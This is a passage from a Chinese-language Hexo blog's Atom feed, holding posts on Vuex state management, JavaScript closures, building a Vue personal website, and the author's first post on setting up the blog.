Vuex规定每个状态值的改变最后都要通过actions函数来操作，并且规定必须是异步，因此调取接口的操作应该都在这里</div><div class="line">     */</div><div class="line">    actions: &#123;</div><div class="line">        <span class="attr">fetchSearchDataAction</span>: <span class="function">(<span class="params">&#123; commit, dispatch &#125;, options</span>) =&gt;</span> &#123;</div><div class="line">            commit(<span class="string">'SET_TOP_LOADING'</span>, &#123; <span class="attr">type</span>: <span class="literal">true</span> &#125;)</div><div class="line">        &#125;,</div><div class="line"></div><div class="line">    &#125;,</div><div class="line"></div><div class="line">    <span class="comment">/**</span></div><div class="line">     * even vuex 2.0 mutations should be async  actions 只是一个架构性的概念，并不是必须的，说到底只是一个函数，你在里面想干嘛都可以，只要最后触发 mutation 就行。</div><div class="line">     */</div><div class="line">    mutations: &#123;</div><div class="line"></div><div class="line">        [types.COMBINE_DETAIL_LIST](state, res) &#123;</div><div class="line"></div><div class="line">            <span class="keyword">let</span> cloneMerchandiseList = [];</div><div class="line"></div><div class="line">            state.merchandiseList.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</div><div class="line"></div><div class="line">                    cloneMerchandiseList.push(<span class="built_in">Object</span>.assign(&#123;&#125;, item, res[item.sm_seq]));</div><div class="line"></div><div class="line">                &#125;)</div><div class="line">                <span class="comment">//combine 合并基础对象和详细属性,重现渲染列表</span></div><div class="line">            state.merchandiseList = cloneMerchandiseList;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line"></div><div class="line">    <span class="attr">getters</span>: &#123;</div><div class="line">        <span class="attr">listDownType</span>: <span class="function">(<span class="params">state</span>) =&gt;</span> &#123;</div><div class="line">            <span class="keyword">let</span> type = <span class="string">''</span></div><div class="line">            state.selectListData.filter(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</div><div class="line">                <span class="keyword">if</span>(item.isSelect)&#123;</div><div class="line">                    type = item.sortType</div><div class="line">                &#125;</div><div class="line">            &#125;)</div><div class="line">            <span class="keyword">return</span> type</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<font color="red">注：同步的意义在于这样每一个 mutation 执行完成后都可以对应到一个新的状态（和 reducer 一样），这样 devtools 就可以打个 snapshot 存下来，然后就可以随便 time-travel 了。</font>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Vuex的作用是什么&quot;&gt;&lt;a href=&quot;#Vuex的作用是什么&quot; class=&quot;headerlink&quot; title=&quot;Vuex的作用是什么&quot;&gt;&lt;/a&gt;Vuex的作用是什么&lt;/h3&gt;&lt;p&gt;Vuex主要用来进行状态管理，我的理解就是当你的VUE项目大到一定程度以后，需要一个帮手来帮助你进行组件管理，尤其是多层次的组件进行信息交互时，如果没有这样一个工具，就得维护公共变量或者一层一层传递参数，这个过程是非常令人不愉悦的。&lt;/p&gt;
&lt;h3 id=&quot;引入&quot;&gt;&lt;a href=&quot;#引入&quot; class=&quot;headerlink&quot; title=&quot;引入&quot;&gt;&lt;/a&gt;引入&lt;/h3&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Vuex &lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;vuex&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; * &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; actions &lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;./actions&#39;&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;//改变状态都得通过这里的方法&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; * &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; getters &lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;./getters&#39;&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;//获取状态值的方法&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;store对象&quot;&gt;&lt;a href=&quot;#store对象&quot; class=&quot;headerlink&quot; title=&quot;store对象&quot;&gt;&lt;/a&gt;store对象&lt;/h2&gt;&lt;p&gt;这个对象就是Vuex创建的实例对象，是重点需要学习的内容。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="https://ganchengyuan1990.github.io/blog/tags/Javascript/"/>
    
      <category term="Vue" scheme="https://ganchengyuan1990.github.io/blog/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>javascript闭包个人理解</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/17/javascript%E9%97%AD%E5%8C%85%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/17/javascript闭包个人理解/</id>
    <published>2017-01-17T00:56:37.000Z</published>
    <updated>2017-01-19T05:35:39.330Z</updated>
    
    <content type="html"><![CDATA[<p>个人理解，闭包的目的就是为了从外部读取内部函数的局部参数而设置的桥梁方法。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">closure</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> n = <span class="number">1</span>;</div><div class="line">    nAdd=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;n+=<span class="number">1</span>; &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">inner</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        alert(n)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> inner;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> result = closure();</div><div class="line">result();</div><div class="line"></div><div class="line">nAdd();</div><div class="line">result(); <span class="comment">// 1000</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> name = <span class="string">"The Window"</span>;</div><div class="line">　　<span class="keyword">var</span> object = &#123;</div><div class="line">　　　　<span class="attr">name</span> : <span class="string">"My Object"</span>,</div><div class="line">　　　　<span class="attr">getNameFunc</span> : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">　　　　　　<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">　　　　　　　　<span class="keyword">return</span> <span class="keyword">this</span>.name;</div><div class="line">　　　　　　&#125;;</div><div class="line">　　　　&#125;</div><div class="line">　　&#125;;</div><div class="line">alert(object.getNameFunc()());</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;个人理解，闭包的目的就是为了从外部读取内部函数的局部参数而设置的桥梁方法。&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/di
    
    </summary>
    
    
      <category term="Javascript" scheme="https://ganchengyuan1990.github.io/blog/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>Vue个人网站搭建</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/16/%E7%AC%AC%E4%B8%80%E7%AF%87/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/16/第一篇/</id>
    <published>2017-01-16T09:13:04.353Z</published>
    <updated>2017-02-06T08:43:56.067Z</updated>
    
    <content type="html"><![CDATA[<p>  自学Vue也有将近一个月了，想做个简单的小作品，正好这段时间自己的阿里云服务器闲置着，而且个人域名一直缺一个主页面，自然就想到做一个小项目来改装一下门庭。</p>
<p>###手机预览(website)<br>  废话不多说，上预览，<a href="http://www.jasongan.cn" target="_blank" rel="external">http://www.jasongan.cn</a></p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h1 id="install-dependencies"><a href="#install-dependencies" class="headerlink" title="install dependencies"></a>install dependencies</h1><p>npm install</p>
<h1 id="serve-with-hot-reload-at-localhost-8080"><a href="#serve-with-hot-reload-at-localhost-8080" class="headerlink" title="serve with hot reload at localhost:8080"></a>serve with hot reload at localhost:8080</h1><p>npm run dev</p>
<h1 id="build-for-production-with-minification"><a href="#build-for-production-with-minification" class="headerlink" title="build for production with minification"></a>build for production with minification</h1><p>npm run build</p>
<p>```</p>
<a id="more"></a>
<h3 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h3><p>  vue-wechat是主要在利用Vue.js。</p>
<p>  此demo在实现上使用了以下技术</p>
<ul>
<li>[x] - vue: “^1.0.21”,  考虑到Vue2.0组件还不够丰富，因此就还是想用1.0+的版本。</li>
<li>[x] - vue-resource: “^1.0.0”,   要获取数据就要调API，在requireJs架构中使用Jquery即可，但是毕竟Jquery与Vue的思想是背道而驰的，因此选择使用”vue-resource”这套组件，她提供了非常友好而已用的API，来帮助我们非常快速简单地进行数据请求。</li>
<li>[x] - mint-ui: “^1.0.2”  UI组件我选择大名鼎鼎的由饿了么前端团队出品的Mint-ui，这套组件文档丰富，更新快（现已完全支持Vue2.0+），能够满足80%左右前端UI的需求。</li>
<li>[x] - vue-echarts: “^1.0.0”,  Echarts我原来就很喜欢了，百度的产品，有非常丰富的图表类型可供选择。原本使用的是Vue-chartjs，但是最后发现”vue-echarts”对”vue-resource”的支持更好（选择组件的过程中发现，一个好的组件，一定要做到对常用其他组件的支持，否则就失去存在意思，会被淘汰）。</li>
<li>[x] - vue-animated-list</li>
<li>[x] - vuex: “^1.0.0-rc.2”,  这个组件的意义在于清晰地状态管理，结合Chrome上的调试工具，玩法很多。</li>
<li>[x] - vue-router</li>
<li>[x] - fastclick</li>
</ul>
<p>注：在这边要提醒一下，一定要保持各组件之间的版本对应，必须时在npm安装时可以简单地在后面加上@X（版本号）来安装对应版本。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  自学Vue也有将近一个月了，想做个简单的小作品，正好这段时间自己的阿里云服务器闲置着，而且个人域名一直缺一个主页面，自然就想到做一个小项目来改装一下门庭。&lt;/p&gt;
&lt;p&gt;###手机预览(website)&lt;br&gt;  废话不多说，上预览，&lt;a href=&quot;http://www.jasongan.cn&quot;&gt;http://www.jasongan.cn&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;h1 id=&quot;install-dependencies&quot;&gt;&lt;a href=&quot;#install-dependencies&quot; class=&quot;headerlink&quot; title=&quot;install dependencies&quot;&gt;&lt;/a&gt;install dependencies&lt;/h1&gt;&lt;p&gt;npm install&lt;/p&gt;
&lt;h1 id=&quot;serve-with-hot-reload-at-localhost-8080&quot;&gt;&lt;a href=&quot;#serve-with-hot-reload-at-localhost-8080&quot; class=&quot;headerlink&quot; title=&quot;serve with hot reload at localhost:8080&quot;&gt;&lt;/a&gt;serve with hot reload at localhost:8080&lt;/h1&gt;&lt;p&gt;npm run dev&lt;/p&gt;
&lt;h1 id=&quot;build-for-production-with-minification&quot;&gt;&lt;a href=&quot;#build-for-production-with-minification&quot; class=&quot;headerlink&quot; title=&quot;build for production with minification&quot;&gt;&lt;/a&gt;build for production with minification&lt;/h1&gt;&lt;p&gt;npm run build&lt;/p&gt;
&lt;p&gt;```&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>搭好了我的博客</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/16/hello-world/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/16/hello-world/</id>
    <published>2017-01-16T08:12:12.622Z</published>
    <updated>2017-01-17T00:51:56.626Z</updated>
    
    <content type="html"><![CDATA[<p>最近这两天工作并不忙，因此有很多时间自学，今天也是用Hexo和Github搭建了这个个人的技术博客，希望以后可以多写点东西，多长进！<br>列一下这段时间准备研究的东西</p>
<h2 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h2><p>对于一个前前端的全栈工程师来说，Node.js是非常好的语言，并且学习社区非常完善，资料健全，很有意思。</p>
<h2 id="Vue-js"><a href="#Vue-js" class="headerlink" title="Vue.js"></a>Vue.js</h2><p>Vue是一个很容易上手的框架，单页面应用也是非常好的一个前端网页思路，有效地减少白屏带来的视觉问题。<br>这两天在做搭个人网站的时候用上了Vue，打包完也有2M左右，组件太丰富，选择是一个问题。</p>
<h2 id="MongoDb"><a href="#MongoDb" class="headerlink" title="MongoDb"></a>MongoDb</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    alert(<span class="string">'hello world'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>数据库的选择，效率不错，API也很好使用。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近这两天工作并不忙，因此有很多时间自学，今天也是用Hexo和Github搭建了这个个人的技术博客，希望以后可以多写点东西，多长进！&lt;br&gt;列一下这段时间准备研究的东西&lt;/p&gt;
&lt;h2 id=&quot;Node-js&quot;&gt;&lt;a href=&quot;#Node-js&quot; class=&quot;heade
    
    </summary>
    
    
  </entry>
  
</feed>
